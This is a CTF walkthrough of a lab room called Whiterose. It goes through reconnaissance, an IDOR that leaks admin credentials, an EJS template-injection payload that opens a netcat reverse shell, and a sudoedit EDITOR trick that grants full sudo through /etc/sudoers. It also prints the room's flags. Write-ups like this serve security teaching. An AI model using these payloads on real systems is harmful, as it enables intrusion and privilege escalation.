---
Title: CTF Walkthrough 2
categories: [CTF, CTF_walkthrough]
tags: [CTF]
---
"<span style="color:yellow">*Always update your dependencies and your packages*</span>."


![cover](/pictures/SWS_pictures/write_up/whiterose/cover.png)

### Room Information
Room Name: Whiterose

Difficulty Level: Easy

Room type: Challenges(CTF)

![cover](/pictures/SWS_pictures/write_up/whiterose/machine.png)

### Reconnaissance
It is given that later we will need this: Olivia Cortez:olivi8

![cover](/pictures/SWS_pictures/write_up/whiterose/info.png)

Let’s run nmap and check what ports are open.

![cover](/pictures/SWS_pictures/write_up/whiterose/nmap.png)

I discovered 2 open ports: 22 and 80,. Since port 80 is open, let’s check the website.

![cover](/pictures/SWS_pictures/write_up/whiterose/website1.png)

When visiting the web servers, we are redirected to cyprusbank.thm. So we will add this to our /etc/hosts and reload the page.
Command: sudo nano /etc/hosts

![cover](/pictures/SWS_pictures/write_up/whiterose/nano.png)

Then reload the page.

![cover](/pictures/SWS_pictures/write_up/whiterose/website2.png)

When I reload the page it shows that the site is under maintenance.
 
So let’s check for any other hidden directories using dirsearch.

![cover](/pictures/SWS_pictures/write_up/whiterose/dirsearch.png)

There are no other hidden directories. Let’s enumerate subdomains using ffuf.

![cover](/pictures/SWS_pictures/write_up/whiterose/ffuf1.png)

![cover](/pictures/SWS_pictures/write_up/whiterose/ffuf2.png)

There are two subdomains (www and admin). Now let’s visit the website using those two subdomains. For that, I need to add in /etc/hosts.

![cover](/pictures/SWS_pictures/write_up/whiterose/domain.png)

Now reload the website with a subdomain in it. 
With the subdomain www, it takes to the landing page.

![cover](/pictures/SWS_pictures/write_up/whiterose/www.png)

With the subdomain admin, it redirects us to a login page. 

![cover](/pictures/SWS_pictures/write_up/whiterose/admin.png)

Credentials for this login are obtained from the room description. 
Name: Olivia Cortez
Password: olivi8

![cover](/pictures/SWS_pictures/write_up/whiterose/bank.png)
 
Once logged in, I knew that the user only had limited access as he couldn’t see the phone number.

![cover](/pictures/SWS_pictures/write_up/whiterose/setting.png)

But we can take a look at the message. There is the chat history.

![cover](/pictures/SWS_pictures/write_up/whiterose/message.png)

Url looks like this: http://admin.cyprusbank.thm/messages/?c=5
So let’s change the parameter value and read all other messages.

![cover](/pictures/SWS_pictures/write_up/whiterose/history.png)

When I changed the parameter value to 0, I got the admin credential.
- Name: Gayle Bev
- Password: p~]P@5!6;rs558:q

Now I will logout from the current user and then log in again using the above credential.

![cover](/pictures/SWS_pictures/write_up/whiterose/phone.png)

![cover](/pictures/SWS_pictures/write_up/whiterose/adminsetting.png)

Wow, now I can see the phone number and also the setting. So it answers the first question.

What's Tyrell Wellick's phone number?

Ans: 842-029-5701

### Now Let’s get to the User. 

Gayle can change users’ passwords, but there wasn’t anything useful there. 

![cover](/pictures/SWS_pictures/write_up/whiterose/change.png)

I fired up Burp Suite to intercept the request. 

![cover](/pictures/SWS_pictures/write_up/whiterose/burp.png)

Then I send it to the repeater.

![cover](/pictures/SWS_pictures/write_up/whiterose/repeater.png)

If we intercept a request and change it by omitting parameters such as the password, an error message appears.

![cover](/pictures/SWS_pictures/write_up/whiterose/error.png)

This tells us that ejs files are included. When i search for ejs ssti payloads, i got this;

![cover](/pictures/SWS_pictures/write_up/whiterose/payload.png)

It is a blog post, from this article I got an payload; 

![cover](/pictures/SWS_pictures/write_up/whiterose/got.png)

#### payload

&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('busybox nc 127.0.0.1 1337 -e sh');s


We need to append this after the password in the burp suite. Note that you need to change IP and port according to yours.

![cover](/pictures/SWS_pictures/write_up/whiterose/append.png)

In the terminal, we need to listen to that port.

![cover](/pictures/SWS_pictures/write_up/whiterose/port.png)

Once we receive the connection we need to run this command: python3 -c 'import pty; pty.spawn("/bin/bash")'

![cover](/pictures/SWS_pictures/write_up/whiterose/user.png)

Finally, boom…..we got the user flag. 

### Privilege Escalation
The next task is to get the root.txt flag. It isn’t as easy as I thought. I can’t get into root just with the command sudo su as I don’t not the password of the web.

![cover](/pictures/SWS_pictures/write_up/whiterose/su.png)

I need to check for sudo privileges.
Command: sudo -l

![cover](/pictures/SWS_pictures/write_up/whiterose/-l.png)

User web can run;
 (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm. 

Let’s do what user web is allowed to do. Select the editor by using the following command:

export EDITOR="vim -- /etc/sudoers"

Then next run this command:  sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
Add the following line under user privilege specification and save.

web ALL=(ALL:ALL) NOPASSWD: ALL

Press i before typing the above command. You need  press enter. Then press escape and then :wq enter again :wq enter. In this way we save it.

![cover](/pictures/SWS_pictures/write_up/whiterose/privi.png)

After that, we can now run sudo su command and get into the root.

![cover](/pictures/SWS_pictures/write_up/whiterose/root.png)

Now I got thaveroot access. Finally, I also got the root.txt


### Flag Captured
- user.txt flag: THM{4lways_upd4te_uR_d3p3nd3nc!3s}

- root.txt flag:  THM{4nd_uR_p4ck4g3s}
